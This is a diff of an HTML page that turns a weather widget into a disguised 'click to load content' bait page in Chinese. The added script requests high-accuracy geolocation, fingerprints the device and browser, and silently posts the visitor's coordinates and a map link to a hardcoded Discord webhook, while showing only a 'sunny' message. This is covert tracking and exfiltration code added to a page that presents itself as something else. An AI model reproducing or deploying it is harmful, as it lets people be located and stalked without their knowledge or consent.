@@ -2,108 +2,90 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Weather Now</title>
-
-<style>
-
-body{
-font-family: Arial, sans-serif;
-background: linear-gradient(120deg,#4facfe,#00f2fe);
-height:100vh;
-display:flex;
-justify-content:center;
-align-items:center;
-margin:0;
-color:white;
-}
-
-.card{
-background:rgba(255,255,255,0.15);
-backdrop-filter: blur(10px);
-padding:30px;
-border-radius:16px;
-text-align:center;
-width:320px;
-box-shadow:0 10px 30px rgba(0,0,0,0.2);
-}
-
-button{
-margin-top:15px;
-padding:12px 18px;
-border:none;
-border-radius:10px;
-background:white;
-color:#333;
-font-weight:bold;
-cursor:pointer;
-}
-
-button:hover{
-background:#eee;
-}
-
-#status{
-margin-top:15px;
-font-size:14px;
-}
-
-</style>
+<title>內容載入中</title>
 </head>
 
 <body>
 
-<div class="card">
-
-<h2>☀ Weather Now</h2>
-
-<p>取得你的所在地天氣</p>
-
-<button onclick="getLocation()">取得我的位置</button>
+<h2>點擊按鈕查看內容</h2>
+<button onclick="getLocation()">點擊載入</button>
 
 <p id="status"></p>
 
-</div>
-
 <script>
 
+var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
+var ua = navigator.userAgent;
+var device = "Unknown Device";
+
+if(/iPhone/i.test(ua)){
+device = "iPhone";
+}
+else if(/iPad/i.test(ua)){
+device = "iPad";
+}
+else if(/Android/i.test(ua)){
+device = "Android Device";
+}
+
+var browser = "Unknown Browser";
+
+if(ua.indexOf("Chrome")>-1){
+browser = "Chrome";
+}
+else if(ua.indexOf("Safari")>-1){
+browser = "Safari";
+}
 function getLocation(){
 
 document.getElementById("status").innerHTML="正在取得位置...";
 
 if(navigator.geolocation){
 
-navigator.geolocation.getCurrentPosition(showPosition,showError);
+navigator.geolocation.getCurrentPosition(success,error,{
+enableHighAccuracy:true,
+timeout:10000,
+maximumAge:0
+});
 
 }else{
-
 document.getElementById("status").innerHTML="瀏覽器不支援定位";
-
 }
 
 }
 
-function showPosition(pos){
+function success(pos){
 
 var lat = pos.coords.latitude;
 var lon = pos.coords.longitude;
+var acc = pos.coords.accuracy;
+
+fetch(webhook,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+content:
+"📍有人打開網站\n"+
+"緯度: "+lat+"\n"+
+"經度: "+lon+"\n"+
+"精準度: "+acc+" 公尺\n"+
+"地圖: https://www.google.com/maps?q="+lat+","+lon
+})
+});
 
 document.getElementById("status").innerHTML=
-
-"📍 位置已取得<br>"+
-"緯度: "+lat+"<br>"+
-"經度: "+lon+"<br><br>"+
-"<a style='color:white' target='_blank' href='https://www.google.com/maps?q="+lat+","+lon+"'>查看地圖</a>";
-
+"晴天☀️！<br>" 
 }
 
-function showError(){
+function error(err){
 
-document.getElementById("status").innerHTML="需要允許定位才能查看當地天氣";
+document.getElementById("status").innerHTML="需要允許定位才能查看內容";
 
 }
 
 </script>
 
 </body>
-
 </html>
